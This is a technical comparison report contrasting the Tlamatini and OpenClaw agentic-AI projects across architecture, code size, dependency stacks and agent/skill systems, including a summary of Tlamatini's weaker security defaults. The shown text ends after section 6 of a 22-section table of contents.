# Tlamatini vs OpenClaw

## An Enterprise-Grade Side-by-Side Comparison

**Document version:** 1.0
**Prepared:** 2026-04-29
**Subject A:** Tlamatini (`C:\Development\Tlamatini`) — Python/Django local-first agentic developer assistant
**Subject B:** OpenClaw (`C:\Development\OpenClaw`) — TypeScript/Node multi-channel agentic platform
**Purpose:** Provide a deep, evidence-anchored comparison across architecture, security, professional engineering practice, deployment, distribution, code volume, GUI surface, skill model, and total enterprise-readiness.

---

## Table of Contents

1. Executive Summary
2. Project Identity and Product Positioning
3. Architectural Topology and Module Layout
4. Codebase Size and Complexity Metrics
5. Technology Stack and Dependency Surface
6. Agents, Skills, and Tool Systems
7. Graphical User Interface and Frontend Surface
8. Security Posture (Deep Dive)
9. Code Professionalism and Engineering Rigor
10. Testing and Quality Assurance
11. Documentation Surface
12. Build, Distribution, and Deployment
13. Versioning and Release Discipline
14. Commit Hygiene and Collaboration Posture
15. Extensibility and Plugin Models
16. Operational Footprint and Scalability
17. Use-Case Suitability Matrix
18. Strengths and Weaknesses by Project
19. Risk Register
20. Recommendations
21. Final Verdict and Master Scoring Table
22. Appendix A: Methodology and Sources

---

## 1. Executive Summary

This document is an evidence-based, enterprise-style comparison of two agentic-AI projects living side-by-side on the same Windows 11 development machine: **Tlamatini**, a Python/Django local-first assistant authored by a single primary developer (`angelahack1`) and oriented toward a personal AI workbench with a 57-node visual workflow designer, and **OpenClaw**, a TypeScript/Node multi-channel agent gateway organized as a pnpm monorepo, owned by a multi-person team, deployable to Fly.io / Render / Hetzner / Docker / Kubernetes, with 131 bundled extensions, native iOS / Android / macOS clients, mature security policy, formal CI/CD, and a published plugin SDK.

The two projects sit at very different points on the agentic-AI maturity curve. **OpenClaw is enterprise-grade infrastructure** with a tiered Docker sandbox model, 27 to 38 GitHub Actions workflows, conventional commits, CODEOWNERS, an 8,254-line CHANGELOG, and a 330-line SECURITY.md. **Tlamatini is a polished single-developer power tool** with a startlingly rich Python/Django backend (FAISS+BM25 RAG, Multi-Turn execution planner, 57 visual agent types, MCP-based context providers, LangChain @tool-driven Unified Agent), wrapped in a Bootstrap web GUI that includes a true drag-and-drop workflow canvas — but with no SECURITY.md, no CHANGELOG, no formal CI, no sandbox model, an `ALLOWED_HOSTS=['*']` Django configuration, hardcoded `user / changeme` defaults, and an `execute_command` LangChain tool that hands the LLM full host-shell privileges.

That contrast is the central finding of this report: **OpenClaw is wider and more battle-hardened; Tlamatini is denser and more inventive in its primary domain (visual agentic workflow design).** OpenClaw's core innovation is at the orchestration boundary — it embeds external agent harnesses (Anthropic, Codex, Cursor, Copilot, Gemini, Qwen, etc.) and brokers them across messaging channels (Discord, Telegram, WhatsApp, Matrix, Slack, etc.) with a sandboxable execution layer. Tlamatini's core innovation is at the user interaction boundary — a 57-agent visual canvas where you wire up Crawler -> Parametrizer -> Apirer -> Notifier flows and execute them headlessly, plus a Multi-Turn execution planner that rewrites Claude's tool selection into a request-scoped DAG with deduplicated wrapped chat-agent calls and post-hoc Exec Reports.

In raw numbers, OpenClaw is 8.4 times Tlamatini's file count (15,671 vs 1,873), but the line-count gap is much narrower (156,518 vs 130,912 LOC) because Tlamatini concentrates its mass into a few very large files — `views.py` alone is 8,534 lines, and the agent/ Django app holds nearly all of the system's logic. OpenClaw is 2.2 times larger on disk (178M vs 80M, source only). Tlamatini has 24,439 lines of Markdown documentation against OpenClaw's 12,526 — a striking inversion that reflects Tlamatini's heavy investment in Claude-Code-aimed onboarding documents (`docs/claude/architecture.md`, `multi-turn.md`, `exec-report.md`, etc.) — but only 103 documentation files versus OpenClaw's 756, meaning Tlamatini's docs are concentrated and Claude-aimed while OpenClaw's are dispersed and human-aimed.

**On security**, the gap is large and unambiguous: OpenClaw scores 8 to 9 out of 10 on every axis (documentation, sandboxing, secrets, network surface, supply chain, injection surface, authentication); Tlamatini scores 1 to 4 on the same axes, primarily because it is by design a single-user local-first tool. The execute_command tool, the wide-open ALLOWED_HOSTS, the plaintext API key in `agent/config.json`, the hardcoded Django SECRET_KEY in `tlamatini/settings.py`, DEBUG=True by default, and the 60-plus `@csrf_exempt` decorators on `views.py` together mean Tlamatini must never be exposed to a network it does not fully trust. This is consistent with how Tlamatini is documented in its CLAUDE.md ("locally-deployed") but is not loudly enough flagged for an unprepared operator.

**On engineering rigor**, OpenClaw rates Strong on 10 of 10 axes (type system, linting, testing, CI/CD, documentation, code organization, commit hygiene, hooks, templates, versioning) versus Tlamatini's mix of Moderate / Weak / Absent — again, perfectly explainable by team size and intended audience but quantitatively visible.

**On agentic capability**, the verdict is more even and more interesting. OpenClaw's strength is **breadth**: provider abstraction across 50+ AI services, 50+ messaging channels, 100+ Python skills, 131 plugin extensions, native iOS / Android / macOS apps. Tlamatini's strength is **depth in one direction**: it is the only one of the two with a true visual workflow designer, a request-scoped global execution planner, an Exec Report system that retroactively shows the user a per-agent table of every tool call the LLM made, and a Create Flow button that converts a successful Multi-Turn answer into a downloadable `.flw` workflow file. Those are real, distinguishing capabilities and they are uncommon outside specialized commercial products.

The two projects are best understood as **complementary, not directly substitutable**. OpenClaw is what an enterprise SRE org would deploy as the bot-and-gateway layer in front of multiple AI providers and channels. Tlamatini is what a developer would run on their own workstation to drive complex local automations through a visual flow editor. Sections 17 to 21 of this document make that recommendation explicit.

---

## 2. Project Identity and Product Positioning

### 2.1 Tlamatini

Tlamatini ("one who knows" in Nahuatl) is a Django-based agentic AI developer assistant designed for local installation and use. The repository at `https://github.com/XAIHT/Tlamatini.git` is GPL-3.0 licensed and primarily authored by `angelahack1`. Its CLAUDE.md describes it as a system featuring "an advanced RAG system (FAISS + BM25, metadata extraction, context budgeting, fallback mode), a request-scoped Multi-Turn orchestration layer with dynamic tool binding and global execution planning, a Visual Agentic Workflow Designer (ACP) with 57+ drag-and-drop agent types, multi-model LLM support (Ollama local, Anthropic Claude cloud, Qwen vision), and a full PyInstaller packaging pipeline."

Identity-wise, the system identifies itself as "Tlamatini" through its prompt template (`agent/prompt.pmt`), behaving as a first-person agent that responds to its own name, runs a multi-turn tool loop bounded by 256 iterations by default, and has a strict output contract that includes `BEGIN-CODE<<<FILENAME>>>` / `END-CODE` blocks, `END-RESPONSE` sentinel markers, HTML tables (not markdown pipe syntax), and INI-style section blocks emitted by Parametrizer-source agents.

Tlamatini is shipped as a Windows-first executable via PyInstaller plus a Tkinter installer. It ships with default credentials (`user / changeme`) intended to be changed by the operator; the README documents these credentials openly.

### 2.2 OpenClaw

OpenClaw is a multi-channel agentic AI gateway and personal-assistant framework. It positions itself as a provider-agnostic, channel-portable, extensible alternative to closed AI assistant platforms. Its tagline references a lobster exoskeleton metaphor — "EXFOLIATE! EXFOLIATE!" — signaling layered modularity. The pnpm monorepo holds the gateway, multiple native client apps (iOS, Android, macOS), a UI control panel, three publicly named workspace packages, and 131 bundled extensions covering channels, providers, and skills.

The OpenClaw value proposition rests on three pillars:

1. **Provider agnosticism** — swap among Anthropic, OpenAI, Ollama, Amazon Bedrock, Vertex AI, Mistral, xAI, Cerebras, Together, GitHub Copilot, Codex, Azure OpenAI, NVIDIA NIM, vLLM, Voyage, etc., without rewriting agent logic.
2. **Channel portability** — the same agent reaches users via Discord, Telegram, WhatsApp, Matrix, Slack, Mattermost, IRC, Feishu, BlueBubbles, voice call, etc.
3. **Sandbox-first execution** — separate Docker images (`Dockerfile.sandbox`, `Dockerfile.sandbox-browser`, `Dockerfile.sandbox-common`) run untrusted tool work isolated from the gateway process, with optional GPU passthrough and capability-dropping.

OpenClaw's deployment story is genuinely multi-cloud: the repository contains `fly.toml` for Fly.io, `render.yaml` for Render, `docker-compose.yml` for self-hosted Docker, `setup-podman.sh` for Podman, and explicit Hetzner instructions in `docs/install/hetzner.md`. The CLI binary `openclaw` is published to NPM, the Docker image to GitHub Container Registry, and the macOS/iOS/Android apps to their respective stores or sideload channels.

### 2.3 Identity-Comparison Table

| Axis                      | Tlamatini                                                                  | OpenClaw                                                                                |
|---------------------------|----------------------------------------------------------------------------|-----------------------------------------------------------------------------------------|
| Name origin               | Nahuatl, "one who knows"                                                   | Lobster claw / "open" branding                                                          |
| Primary author            | angelahack1 (single primary developer)                                     | Multi-author team (CODEOWNERS lists named owners)                                       |
| License                   | GPL-3.0                                                                    | Open-source license referenced in LICENSE file                                          |
| Repository                | github.com/XAIHT/Tlamatini.git                                             | GitHub-hosted with ghcr.io image registry                                               |
| Primary platform          | Windows 11 (Python/Django, PyInstaller, NSIS installer)                    | Linux/macOS via Docker / Node 22.12+; native mobile apps                                |
| Deployment paradigm       | Local desktop install                                                      | Cloud-deployable (Fly.io, Render, Hetzner) plus self-hosted Docker                      |
| Default credentials       | `user / changeme` (documented)                                             | Operator-provided gateway token + per-channel credentials                               |
| Default network bind      | Django runserver / Daphne (typically 127.0.0.1 but `ALLOWED_HOSTS=['*']`)  | `gateway.bind="loopback"` by default (SECURITY.md)                                      |
| Identity model            | Single first-person agent named "Tlamatini" with a custom system prompt    | Multi-agent harness routing through ACPX (Pi, Claude Code, Cursor, Codex, Gemini, etc.) |
| Audience                  | Local developer using a visual flow editor                                 | Enterprise/team operating an AI gateway across messaging platforms                      |

---

## 3. Architectural Topology and Module Layout

### 3.1 Tlamatini Topology

Tlamatini is organized as a single Django project (`Tlamatini/tlamatini/`) hosting one substantive Django app (`Tlamatini/agent/`) where essentially all business logic lives. Surrounding the Django project are top-level Python scripts for build (`build.py`), installer creation (`build_installer.py`, `build_uninstaller.py`), Tkinter installers (`install.py`, `uninstall.py`), the project README, the CLAUDE.md import manifest, and a `docs/claude/` folder with seven specialized onboarding documents.

The agent/ app contains roughly thirty Python modules covering:

- **Routing and views** — `views.py` (8,534 lines, 124 view functions), `urls.py`, `consumers.py` (1,300 lines async WebSocket handler).
- **Tooling** — `tools.py` (2,797 lines of LangChain `@tool` definitions including `execute_command`, `agent_starter`, `agent_stopper`, `unzip_file`, `decompile_java`, `googler`, plus 32 wrapped chat-agent launchers).
- **Multi-Turn orchestration** — `mcp_agent.py` (907 lines for `MultiTurnToolAgentExecutor`), `global_execution_planner.py`, `capability_registry.py`, `chat_agent_registry.py`, `chat_agent_runtime.py`, `global_state.py` (thread-safe singleton).
- **RAG pipeline** — the `rag/` package with `factory.py`, `interface.py`, sub-`chains/` for `basic.py`, `history_aware.py`, and `unified.py`.
- **Agents** — the `agents/` folder with 57 sub-folders, one per workflow agent type (Starter, Ender, Stopper, Cleaner, Sleeper, Croner, Raiser, Forker, Asker, Counter, OR, AND, Barrier, Executer, Pythonxer, Prompter, Summarizer, Crawler, Googler, Apirer, Gitter, Ssher, Scper, Dockerer, Kuberneter, Pser, Jenkinser, Sqler, Mongoxer, Mover, Deleter, Shoter, Mouser, Keyboarder, File-Creator, File-Interpreter, File-Extractor, Image-Interpreter, J-Decompiler, Telegramer, Kyber-KeyGen, Kyber-Cipher, Kyber-DeCipher, Parametrizer, FlowBacker, Gatewayer, Gateway-Relayer, Node-Manager, Monitor-Log, Monitor-Netstat, Emailer, RecMailer, Notifier, Whatsapper, TelegramRX, FlowHypervisor, FlowCreator).
- **Imaging** — `imaging/` for dual-backend image analysis (Anthropic Claude vision plus Qwen vision).
- **Services** — `services/filesystem.py`, `services/response_parser.py`, `services/answer_analizer.py`.
- **Doc generation** — `doc_generation/refresh_project_docs.py` and `doc_generation/mardown_to_pdf.py` (sic — typo preserved by upstream).
- **Templates and static** — `templates/agent/` with HTML templates and `static/agent/{css,js,sounds}/` with 23 JavaScript modules (8 chat + 11 ACP + 4 shared) and `notification.wav` / `hypervisor_alert.wav`.
- **Migrations** — 70 Django migration files representing 14+ rounds of schema iteration.

The agent/ app communicates externally through three channels: WebSocket (Django Channels via Daphne), HTTP (over 100 view endpoints), and gRPC (only for the Files-Search MCP server `mcp_files_search_server.py`). MCP context providers run as long-lived sub-processes started from `apps.py` and `management/commands/startserver.py`.

### 3.2 OpenClaw Topology

OpenClaw is a pnpm workspace monorepo with multiple top-level patterns:

- **`src/`** — the core TypeScript runtime (~40 subdirectories): `acp/` (Agent Client Protocol implementation), `agents/` (lifecycle, providers, embedded harnesses), `channels/` (protocol implementations for Discord, Telegram, WhatsApp, Matrix, Slack, Mattermost, IRC, etc.), `cli/`, `gateway/` (WebSocket server for local/remote pairing), `context-engine/` (memory and prompt compaction), `cron/`, `plugins/` (loader and manifest parser), `plugin-sdk/` (public SDK surface), `commands/` (slash commands and approval flow), `canvas-host/` (browser GUI rendering and A2UI bundle), `terminal/` (TUI).
- **`packages/`** — three workspace packages: `plugin-sdk/`, `memory-host-sdk/`, `plugin-package-contract/`. The plugin SDK exports 50+ subpath imports for plugin authors (`openclaw/plugin-sdk/core`, `runtime`, `setup`, `provider-setup`, `sandbox`, etc.).
- **`extensions/`** — 131 bundled extensions, each with its own `openclaw.plugin.json` manifest, `package.json`, `src/`, and optional `skills/` directory. Categories include **channels** (anthropic, openai, ollama, discord, telegram, whatsapp, matrix, slack, feishu, tlon, zalo, qio, wechat, mattermost, irc, bluebubbles, voice-call, talk-voice), **providers** (anthropic, openai, amazon-bedrock, vertex-ai, ollama, azure-openai, github-copilot, codex, cerebras, mistral, together, xai, mistral-codestral, nvidia-nim, vllm, arcee, lingui, voyage), and **skills/tools** (active-memory, auto-reply, browser, canvas, coding-agent, crestodian, webhooks, video-generation-core).
- **`apps/`** — native client apps: `ios/` (Swift/SwiftUI iOS app), `android/` (Kotlin Android), `macos/` (Swift macOS desktop), `macos-mlx-tts/` (Apple Silicon MLX-based TTS), `shared/` (cross-platform Swift code).
- **`skills/`** — 100+ Python-based skills organized by integration target (1password, apple-notes, blogwatcher, camsnap, clawhub, github, gmail, jira, notion, slack-admin, todoist, trello, etc.). Each skill is a Markdown SKILL.md plus optional Python implementation and pytest tests.
- **`ui/`** — Vite-built Lit.js Control UI for agent management, configuration, channel monitoring (not a chat interface).
- **`docs/`** — extensive documentation organized into `concepts/`, `cli/`, `gateway/`, `debug/`, `diagnostics/`, `channels/`, `automation/`, `install/`. Indexed by `docs.json` (48KB structured index).
- **`test/`, `qa/`, `test-fixtures/`** — Vitest test suites, e2e tests, test doubles, and the QA harness used by GitHub Actions.
- **`.github/`** — CI workflows, labeler config, PR template, issue templates, CODEOWNERS.
- **Top-level files** — `openclaw.mjs` (CLI entry), `Makefile`, `Dockerfile`, three sandbox Dockerfiles, `docker-compose.yml`, `fly.toml`, `fly.private.toml`, `render.yaml`, `setup-podman.sh`, `appcast.xml` (Sparkle auto-update feed for the macOS app), `knip.config.ts`, `pyproject.toml` (skills linting), `pnpm-lock.yaml`.

The architectural style is best described as **gateway + plugin host + delegated harnesses**: the gateway manages WebSocket sessions and channel adapters; plugins extend it via the SDK; agents talk to provider runtimes and (via ACPX) embed external harnesses such as Pi, Claude Code, Cursor, Codex, Copilot, Gemini, Qwen, Kiro, Kimi, iFlow, Factory Droid, Kilocode, OpenCode. Tools reach agents via the Model Context Protocol (MCP), with transports including stdio, HTTP, SSE, and streamable-HTTP.

### 3.3 Topology Comparison

| Dimension                | Tlamatini                                                | OpenClaw                                                                       |
|--------------------------|----------------------------------------------------------|--------------------------------------------------------------------------------|
| Repo style               | Single Django project + one app                          | pnpm workspace monorepo                                                        |
| Source tree breadth      | ~30 modules in `agent/`                                  | ~40 src/ subdirs, 131 extensions, 3 packages, 4 apps, 100+ skills              |
| Largest single file      | `agent/views.py` (8,534 lines)                           | None comparably large; logic is split across many small TS files               |
| Concentration risk       | High (one app, one giant views.py, one tools.py)         | Low (boundaries enforced; core cannot import plugin internals)                 |
| Communication            | WebSocket (Channels) + HTTP + internal gRPC + WebSocket  | WebSocket gateway + plugin SDK + MCP + ACP                                     |
| Internal isolation       | Process-level (MCP servers as sub-processes)             | Container-level (multiple sandbox Dockerfiles + cap_drop)                      |
| External AI              | Direct Ollama / Anthropic SDK / Qwen client              | MCP brokered + provider-specific extensions                                    |
| Native client surface    | Web GUI only (Bootstrap)                                 | Web Control UI + native iOS, Android, macOS apps                               |

---

## 4. Codebase Size and Complexity Metrics

### 4.1 Headline Numbers

| Metric                                            | Tlamatini  | OpenClaw   | Ratio / Note                                              |
|---------------------------------------------------|------------|------------|-----------------------------------------------------------|
| Total source files (excluding node_modules, etc.) | 1,873      | 15,671     | OpenClaw is 8.4x by file count                            |
| Total LOC across all tracked languages            | 130,912    | 156,518    | OpenClaw has +19.6% LOC overall                           |
| Python LOC                                        | 68,618     | 0 in core (Python only in skills/) | Tlamatini-only        |
| TypeScript / TSX LOC                              | 0          | 4,891 (core) + extensions | OpenClaw-only                       |
| JavaScript / JSX / MJS LOC                        | 0 in core  | 66,135     | OpenClaw frontend + bundled                               |
| HTML LOC                                          | 609        | 3,069      | OpenClaw 5x more templates                                |
| CSS / SCSS LOC                                    | 3,339      | 22,429     | OpenClaw 6.7x more styling                                |
| Markdown LOC                                      | 24,439     | 12,526     | Tlamatini almost 2x more markdown content                 |
| Markdown files                                    | 103        | 756        | OpenClaw 7.3x more markdown files                         |
| YAML LOC                                          | 1,949      | 42,082     | OpenClaw 21.6x — CI/CD/manifests dominate                 |
| JSON LOC                                          | 10,243     | 52,841     | OpenClaw 5x — manifest + config heavy                     |
| Shell-script LOC                                  | 0          | 22,625     | Tlamatini ships no shell scripts                          |
| Number of distinct packages / Django apps         | 1 main app | 8 (3 packages + 4 apps + ui)        | OpenClaw modularized                |
| Number of plugin/extension dirs                   | 57 agents (in tree but tightly coupled to core) | 131 extensions (loosely coupled via SDK) | Different topologies |
| Test files                                        | 1 (tests.py) | 4,917 .test.ts + .test.tsx files (~293 dedicated test modules) | Vast difference |
| Test LOC                                          | 2,502      | ~34,479    | OpenClaw 13.8x                                            |
| Database migrations                               | 70         | 0 (no relational DB schema in core) | Tlamatini has DB-backed agent toggles |
| Static / asset files                              | 193        | 58         | Tlamatini ships more in-tree assets (sounds, JS modules)  |
| Disk size (excluding build artifacts)             | 80 MB      | 178 MB     | OpenClaw 2.2x                                             |

### 4.2 Concentration vs Distribution

The numbers above tell a clear story about how each project distributes complexity:

- **Tlamatini concentrates.** The single file `agent/views.py` is 8,534 lines holding 124 view functions. `agent/tools.py` is 2,797 lines. `agent/consumers.py` is 1,300 lines. `agent/mcp_agent.py` is 907 lines. The top four files alone account for over 13,500 LOC — about 20% of the entire Python tree of the project. The sole test file `agent/tests.py` is 2,502 lines with 23 test classes (including `P0HardeningTests`, `CapabilitySelectionTests`, `MultiTurnToolQuotaTests`, `ExecReportCaptureTests`, and several others). This is consistent with single-developer authorship — one person can keep mental indexes of large files but rarely partitions code further than productivity demands.

- **OpenClaw distributes.** Test files alone number 4,917 across the monorepo. Core source files are typically a few hundred lines. The 131 extensions each live in their own folder with their own package.json, manifest, source, tests, and skills. This is the textbook shape of a many-author monorepo, and pnpm workspaces plus `knip.config.ts` are exactly the tools you reach for to keep that distribution from rotting into duplication.

### 4.3 Why the Markdown Gap is Inverted

Tlamatini has 24,439 lines of markdown across 103 files; OpenClaw has 12,526 lines across 756. The asymmetry is real and deliberate: Tlamatini's markdown is dominated by **deeply written, Claude-Code-targeted onboarding** (the `docs/claude/*.md` family — `architecture.md`, `multi-turn.md`, `exec-report.md`, `agents.md`, `mcp-tools.md`, `frontend.md`, `gotchas.md` — plus a 4,479-line README and the 44KB KIMI.md and 10KB CLAUDE.md). OpenClaw's markdown is **wider but shallower** — many small SKILL.md files, channel-specific install guides, and per-extension READMEs that exist mainly to document a small surface. Both approaches are valid but they reveal who the docs are for: Tlamatini's docs help Claude build a working mental model of an evolving codebase; OpenClaw's docs help operators stand up a specific channel or plug in a specific provider.

### 4.4 Top-File Concentration Comparison

| Project   | Largest source file | Lines | Function or module count                         |
|-----------|---------------------|-------|--------------------------------------------------|
| Tlamatini | `agent/views.py`    | 8,534 | 124 Django view functions                        |
| Tlamatini | `agent/tools.py`    | 2,797 | LangChain @tool definitions + parsers            |
| Tlamatini | `agent/tests.py`    | 2,502 | 23 test classes                                  |
| Tlamatini | `agent/consumers.py`| 1,300 | Async WebSocket consumer                         |
| Tlamatini | `agent/mcp_agent.py`| 907   | MultiTurnToolAgentExecutor + dedup + Exec Report |
| OpenClaw  | (no comparable concentration; largest core files are 1-3K lines, test scaffolds and channel adapters; the bulk lives in 131 extensions) |       |   |

---

## 5. Technology Stack and Dependency Surface

### 5.1 Tlamatini Stack

| Layer       | Technology                                                                                                                     |
|-------------|--------------------------------------------------------------------------------------------------------------------------------|
| Language    | Python 3.12+                                                                                                                   |
| Web         | Django 5.2.4, Django Channels 4.1, Daphne (ASGI)                                                                               |
| Frontend    | HTML5, Bootstrap 5, jQuery, jQuery UI, hand-written JavaScript modules (23 files)                                              |
| AI / ML     | LangChain 0.3.27, LangGraph 0.2.74, FAISS, rank-bm25, PyAutoGUI                                                                |
| LLM SDKs    | Anthropic 0.74.1, Ollama REST, MCP 1.25.0                                                                                      |
| Database    | SQLite                                                                                                                         |
| Realtime    | WebSockets (Channels), gRPC (grpcio 1.76.0)                                                                                    |
| Packaging   | PyInstaller, NSIS installer (via custom builders)                                                                              |
| Browser     | Playwright 1.52.0 (used by Googler tool)                                                                                       |
| Vision      | Qwen vision (HTTP) and Anthropic vision (via Anthropic SDK)                                                                    |
| Crypto      | CRYSTALS-Kyber via vendored implementation in three Kyber-* agents                                                             |
| Lint        | Ruff 0.14.5 declared but no `ruff.toml` configuration file                                                                     |
| Frontend lint | `eslint.config.mjs` for JavaScript                                                                                           |

Total declared Python dependencies in `requirements.txt`: 62 pinned packages.

### 5.2 OpenClaw Stack

| Layer         | Technology                                                                                                                                    |
|---------------|-----------------------------------------------------------------------------------------------------------------------------------------------|
| Language      | TypeScript 6.0.3 (strict mode)                                                                                                                |
| Runtime       | Node.js 22.12+ (enforced by `openclaw.mjs`)                                                                                                   |
| Package mgr   | pnpm 10.33.0 with frozen lockfile                                                                                                             |
| Build         | tsdown (TypeScript -> JS), esbuild (bundling), rolldown (experimental)                                                                        |
| Frontend      | Lit 3.3.2, @lit/context, @lit-labs/signals, Vite                                                                                              |
| Lint / format | Oxlint 1.61.0 (Rust-based), oxfmt 0.46.0; pre-commit framework; Knip dead-code; SwiftLint (iOS); shellcheck                                   |
| Test          | Vitest 4.1.5, Vitest coverage v8, JSDOM, pytest (skills)                                                                                      |
| Validation    | Zod 4.3.6 (boundaries), TypeBox 1.1.33 (model schemas)                                                                                        |
| Protocols     | @modelcontextprotocol/sdk 1.29.0, @agentclientprotocol/sdk 0.20.0                                                                             |
| LLM SDKs      | openai 6.34.0, @mariozechner/pi-* 0.70.5, anthropic via extension                                                                             |
| Real-time     | ws 8.20.0 WebSocket                                                                                                                           |
| Cron          | croner 10.0.1                                                                                                                                 |
| Vector store  | sqlite-vec 0.1.9                                                                                                                              |
| CLI           | commander 14.0.3, chalk 5.6.2                                                                                                                 |
| Markdown      | markdown-it 14.1.1                                                                                                                            |
| Config        | yaml 2.8.3, JSON5                                                                                                                             |
| Archive       | jszip 3.10.1                                                                                                                                  |
| Mobile / TTS  | @lydell/node-pty (PTY for voice), MLX TTS on macOS                                                                                            |
| Browser       | playwright-core (on-demand)                                                                                                                   |
| Channels      | @grammyjs/types (Telegram), discord-api-types (Discord), @whiskeysockets/baileys 7.0.0-rc.9 (WhatsApp), @matrix-org/matrix-sdk-crypto-nodejs  |
| Local models  | node-llama-cpp, ollama provider plugin                                                                                                        |

Direct + dev dependencies in root `package.json`: 67 packages, plus per-extension package manifests.

### 5.3 Dependency-Surface Observations

The two projects share roughly the same overall *count* of declared dependencies (62 vs 67), but the surface area differs in three important ways:

1. **Lockfile discipline.** OpenClaw has `pnpm-lock.yaml` (477 KB) which records integrity hashes for every transitive dependency. Tlamatini has only `requirements.txt`, no `pip-compile`-style lockfile. A reproducible Tlamatini build depends on the index serving exactly the pinned versions and on `pip` resolving identical transitive trees — for an installer-shipped product, that fragility is real.
2. **Override / patch policy.** OpenClaw declares `pnpm.overrides` to pin known-vulnerable transitive dependencies (axios, follow-redirects, uuid) and uses `pnpm.patchedDependencies` to apply local patches to `@whiskeysockets/baileys` (the WhatsApp SDK) and `@agentclientprotocol/claude-agent-acp`. Tlamatini has no equivalent; if a transitive dependency goes bad, the project must wait for an upstream fix or pin a parent.
3. **Runtime version policy.** OpenClaw enforces a minimum Node.js version at startup (`openclaw.mjs` checks 22.12.0+). Its SECURITY.md additionally requires Node 22.14.0+ to pick up CVE-2025-59466 and CVE-2026-21636 fixes. Tlamatini's CLAUDE.md says "Python 3.12+" but does not enforce it programmatically.

---

## 6. Agents, Skills, and Tool Systems

### 6.1 Tlamatini's 57-Agent Visual Workflow Catalog

Tlamatini's most distinguishing capability is its **57 visual agent types**, each implemented as a Python script in `agent/agents/<agent_name>/<agent_name>.py` with an accompanying `config.yaml`. Agents are categorized as follows:

- **Control (6):** Starter, Ender, Stopper, Cleaner, Sleeper, Croner.
- **Routing (4):** Raiser, Forker, Asker, Counter.
- **Logic gates (3):** OR (2-input), AND (2-input), Barrier (N-input).
- **Action (24):** Executer, Pythonxer, Prompter, Summarizer, Crawler, Googler, Apirer, Gitter, Ssher, Scper, Dockerer, Kuberneter, Pser, Jenkinser, Sqler, Mongoxer, Mover, Deleter, Shoter, Mouser, Keyboarder, File-Creator, File-Interpreter, File-Extractor, Image-Interpreter, J-Decompiler, Telegramer.
- **Cryptography (3):** Kyber-KeyGen, Kyber-Cipher, Kyber-DeCipher (post-quantum).
- **Utility (5):** Parametrizer (single-lane parameter-routing queue), FlowBacker, Gatewayer (HTTP webhook + folder-drop ingress), Gateway-Relayer (GitHub/GitLab webhook bridge), Node-Manager (infrastructure registry).
- **Terminal/Monitoring (8):** Monitor-Log, Monitor-Netstat, Emailer, RecMailer, Notifier, Whatsapper, TelegramRX, FlowHypervisor (LLM-powered watchdog), FlowCreator (LLM-driven flow designer).

Each agent is a separate process started by Starter (or another upstream agent), monitored by source_agents-watching downstream agents, and terminated either by Ender or by completing its own work. The agents communicate by writing structured log lines (and, for parametrized pipelines, by emitting `INI_SECTION_<TYPE><<<...>>>END_SECTION_<TYPE>` blocks consumed by Parametrizer to populate the next agent's `config.yaml`).

Each agent has a CSS class in `agentic_control_panel.css`, a sidebar entry, drag-and-drop placement on the ACP canvas (in `acp-canvas-core.js`), and connection-handler logic in `acp-agent-connectors.js`. The connection model uses three named edge types: `target_agents` (start downstream), `source_agents` (monitor upstream logs), and `output_agents` (Stopper/Ender/Cleaner-only special edges).

### 6.2 Tlamatini's Tools and Wrapped Chat-Agent Launchers

Beyond the visual flow agents, Tlamatini exposes a separate set of **LangChain `@tool` functions** in `agent/tools.py` for direct LLM use during Multi-Turn execution. These include `execute_command`, `agent_parametrizer`, `agent_starter`, `agent_stopper`, `agent_stat_getter`, `launch_view_image`, `unzip_file`, `decompile_java`, `googler`, plus 32 wrapped chat-agent launchers (e.g. `chat_agent_executer`, `chat_agent_apirer`, `chat_agent_gitter`, `chat_agent_file_creator`, etc.) that let the LLM run a single agent headlessly without authoring a full flow. Each wrapped launcher has an `example_request` string (used by the LLM to learn argument syntax) — and a recently-discovered subtlety in the parser (`_split_assignment_segments`, `_closes_outer_quote`) is that arguments are separated by the natural-language conjunction `and` (occasionally `with`), so the parser must split on those conjunctions as well as `,`/`;`.

A small but consequential capability is the **MultiTurnToolAgentExecutor** in `mcp_agent.py`, which deduplicates wrapped chat-agent launches with identical arguments (`_wrapped_agent_signatures`), preventing the LLM from launching the same sub-agent twice in a single request, and which maintains an `_exec_report_entries` list that retroactively renders per-agent execution tables onto the final answer when the user has the "Exec Report" toolbar checkbox enabled.

### 6.3 OpenClaw's Skills, Extensions, and ACPX Routing

OpenClaw uses a different mental model: rather than 57 typed nodes drawn on a canvas, it has **skills** (Markdown SKILL.md files with YAML frontmatter, optionally backed by Python or shell), **extensions** (TypeScript plugin packages with `openclaw.plugin.json` manifests), and **agent harnesses** (external systems like Pi, Claude Code, Cursor, Codex, Copilot, Gemini, Qwen, Kiro, Kimi, iFlow, Factory Droid, Kilocode, OpenCode, embedded as child processes via ACPX).

- **Skills** are routable runtime hints. The `acp-router` skill (in `extensions/acpx/skills/acp-router/SKILL.md`) takes plain-language requests and dispatches them to the appropriate ACP harness. Skills are loaded dynamically: `resolvePluginSkillDirs()` in `src/agents/skills/plugin-skills.ts` scans enabled-plugin manifests and returns the active skill paths.

- **Extensions** are full TypeScript packages. Each declares a manifest (`openclaw.plugin.json`) with `id`, `activation` (e.g. `onStartup`, `onConfigPaths`), `enabledByDefault`, `skills`, `configSchema`, `uiHints`, `configContracts`. There are 131 extensions, covering channels, providers, tools, and integrations. Plugins use only `openclaw/plugin-sdk/*` imports — `knip.config.ts` enforces that core never imports plugin internals.

- **Agent harnesses** are not extensions; they are **external CLIs** that ACPX spawns and brokers. The conceptual difference matters: Tlamatini owns its agents end-to-end (the Crawler agent is a Python script Tlamatini runs); OpenClaw orchestrates external CLIs (`claude`, `pi`, `cursor`, `codex`, `gemini`, `qwen`, etc.) and exposes their tools through MCP servers.

- **Tool delivery uses MCP.** `src/agents/bundle-mcp-config.ts` merges plugin-bundled MCP defaults with user config. Transports: stdio, HTTP, SSE, streamable-HTTP. The `openclaw cli` command can launch any agent with a curated MCP server set bundled by enabled plugins.

### 6.4 Skill / Tool Comparison

| Dimension                       | Tlamatini                                                                | OpenClaw                                                                                |
|---------------------------------|--------------------------------------------------------------------------|-----------------------------------------------------------------------------------------|
| Native agent types              | 57 visual workflow agent types                                           | None native; ACPX routes to 12+ external harnesses                                      |
| Tools available to LLM directly | LangChain @tool: ~10 first-class + 32 wrapped chat-agent launchers       | MCP brokered tools per provider; tool surface depends on enabled plugins                |
| Tool authoring                  | Edit `agent/tools.py`, register in `get_mcp_tools()`, add `Tool` row     | Author MCP server, register in plugin manifest, install plugin                          |
